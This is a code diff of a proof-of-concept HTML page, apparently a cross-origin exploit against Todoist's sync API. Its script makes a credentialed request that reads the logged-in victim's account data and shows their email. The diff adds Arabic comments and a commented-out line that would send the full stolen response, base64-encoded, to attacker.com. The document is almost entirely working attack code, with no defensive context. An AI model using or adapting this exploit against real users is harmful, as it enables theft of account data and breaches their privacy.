@@ -1,21 +1,23 @@
-<!-- index.html -->
+<!-- k.html -->
 <html>
   <body>
-    <h2>PoC: Stealing Todoist Data</h2>
+    <h2>PoC: Todoist CORS Exploit</h2>
     <script>
       fetch("https://app.todoist.com/api/v1/sync", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json",
+          "Content-Type": "application/json"
         },
         body: JSON.stringify({
           resource_types: ["user"]
         }),
-        credentials: "include"
+        credentials: "include"  // لازم علشان يبعَت الكوكيز
       })
-      .then(res => res.json())
+      .then(response => response.json())
       .then(data => {
-        alert("User email: " + data.user.email); // إثبات واضح
+        alert("User email: " + data.user.email);
+        // لو عايز تبعت البيانات لسيرفرك:
+        // fetch("https://attacker.com/log?d=" + btoa(JSON.stringify(data)));
       });
     </script>
   </body>
